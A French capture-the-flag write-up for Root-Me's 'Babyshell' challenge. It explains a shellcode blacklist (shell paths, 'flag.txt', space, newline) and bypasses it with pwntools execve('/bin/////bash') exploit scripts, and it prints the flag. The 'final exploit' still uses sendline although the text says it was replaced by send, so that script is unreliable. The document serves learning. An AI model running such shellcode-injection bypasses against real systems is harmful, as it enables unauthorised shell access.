# Babyshell

<p align="center">
<img src="https://cdn.discordapp.com/attachments/693164567307616310/1033811198585614416/unknown.png">
</p>

<br>
Ce challenge est le premier de la suite de challenge dans la catégorie pwn du CTF Root-Me. Il s'agit d'un challenge relativement simple à première vue: 
écrire un shellcode qui permet d'obtenir un shell. Cependant, on va le voir il y a un petit piège ou deux.
<br><br>

Tout d'abord, une fois le fichier téléchargé le premier réflexe est de le mettre dans Binary Ninja, et de regarder ce qu'il fait exactement. 
Le programme est relativement petit et n'a que deux fonctions importantes. 
L'une des deux est la fonction ``main``.<br><br>

## main()

<p align="center">
<img src="https://cdn.discordapp.com/attachments/693164567307616310/1033812795654930524/unknown.png">
</p>
<br>

La fonction est simple: <br>
1) ``mmap()`` et utilisé sur une région et la accessible en écriture, lecture et exécution. La fonction ``mmap()`` a un peu le même effet que la commande ``chmod`` sous linux, à la différence près que cette fois-ci c'est une partie de la pile, et non un fichier dont on change les permissions d'accès.
L'utilisation de cette fonction tombe donc sous le sens: le but est d'exécuter un shellcode, il faut donc pouvoir le mettre quelque part, et ensuite l'exécuter!<br>
2) On nous demande notre shellcode, puis celui-ci est passé dans la fonction ``check_shellcode()``. On reviendra bien vite à cette fonction. Cependant, si 
la ``check_shellcode()`` renvoie une autre valeur que 0, la condition n'est pas remplie et par conséquent notre shellcode ne sera pas exécuté.<br>
3) Le programme exécute le shellcode et supprime les permissions ajouté par ``mmap()``.
<br><br>

## check_shellcode()

<p align="center">
<img src="https://cdn.discordapp.com/attachments/693164567307616310/1033816015643103405/unknown.png">
</p>
<br>
Cette fonction n'est pas très complexe non plus, en quelques mots ce qu'elle fait c'est qu'elle cherche soit pour une chaine de caractère soit un caractère précis.
Si c'est trouvé la fonction va renvoyer une valeur différente de 0, et du coup nous empêcher d'exécuter notre shellcode.<br>
Mais quelles (chaines de) caractères sont bloqués exactement?<br>
En regardant ``BLACKLISTED_STRINGS`` on peut trouver les chaines bloquées
<p align="center">
<img src="https://cdn.discordapp.com/attachments/693164567307616310/1033818189156585534/unknown.png">
</p>
<br>
On sait donc maintenant que ``/bin/bash``, ``/bin/sh``, ``/bin//sh`` et ``flag.txt`` sont des chaines interdites. En regardant ``BLACKLISTED_CHARS`` on peut trouver les caractères bloqués.
<br>
<p align="center">
<img src="https://cdn.discordapp.com/attachments/693164567307616310/1033818900451831878/unknown.png">
</p>
Et maintenant on sait que les caractères 0x20 (un espace) et 0x0a (un retour à la ligne) sont aussi interdits!

## Création d'un exploit
La première idée qui m'est venue en tête est une idée un peu plus compliquée que besoin (et au final pas forcément faisable). Et si j'appelais simplement la fonction ``fgets()`` ? Je pourrais directement écrire dans la zone exécutable et ne pas avoir à passer par la fonction ``check_shellcode()``! <br>
Je me mets donc à créer l'exploit, et la je lance! Plus qu'à attendre le shell... ou pas! Bizarrement, mon exploit est bloqué? Mmmh bizarre, j'y reviendrais plus tard mais pour le moment j'ai abandonné cette idée. Une solution bien plus simple me vient en tête. Je peux simplement utiliser ``execve()`` (j'aurais aussi pû utiliser ``system()``) et appeler ``/bin/////bash``!<br>
Cette fonction a pour but d'exécuter un programme en donnant son chemin d'accès, du coup ça exécuterait ``/bin/////bash`` et me donnerait un shell.<br>
Je me mets donc au boulot et obtiens cet exploit:<br>

```py
from pwn import *
context.arch = "amd64"

io = process('./babyshell')

shellcode = asm(shellcraft.execve("/bin/////bash"))
io.sendline(shellcode)

io.interactive()

```
*J'utilise ``shellcraft`` qui vient de pwntools pour me simplifier la vie, mais on peut aussi très bien écrire à la main le shellcode. Si vous voulez plus d'info sur ``shellcraft`` vous pouvez trouver ça [ici](https://docs.pwntools.com/en/stable/shellcraft.html)*
<br><br>
Je le lance donc en local et... toujours pas accepté! À ce moment je commence à vraiment me poser des questions et débugger mon payload. Après 5 à 10 minutes, je réalise mon erreur et sens un terrible sentiment d'epic fail. La fonction ``sendline()`` ajoute automatiquement un retour à la ligne à ce que j'envoie. Ca vous rappelle pas quelque chose le retour à la ligne? Et ouais! C'est un des caratères qui est interdit!<br>
Du coup, je modifie ``io.sendline(shellcode)`` par ``io.send(shellcode)``, je relance en local et hop! J'ai un shell. Plus qu'à modifier et tester en remote.<br>

## Exploit final
<br>

```py
from pwn import *
context.arch = "amd64"

io = remote('ctf10k.root-me.org', 5004)

shellcode = asm(shellcraft.execve("/bin/////bash"))
io.sendline(shellcode)

io.interactive()
```

<br>
<p align="center">
<img src="https://cdn.discordapp.com/attachments/693164567307616310/1033822138844598322/unknown.png">
</p>
<br>
<br>
Flag: ``RM{__tw34k1ng_sh3llc0dez_4_dumm13s!}``

## Petit mot de fin
Ce challenge n'était pas extrêmement compliqué, mais c'était chouette de le résoudre. J'ai bien aimé le CTF en général et j'espère que tous ceux qui y ont joué ont eu autant de fun que moi!
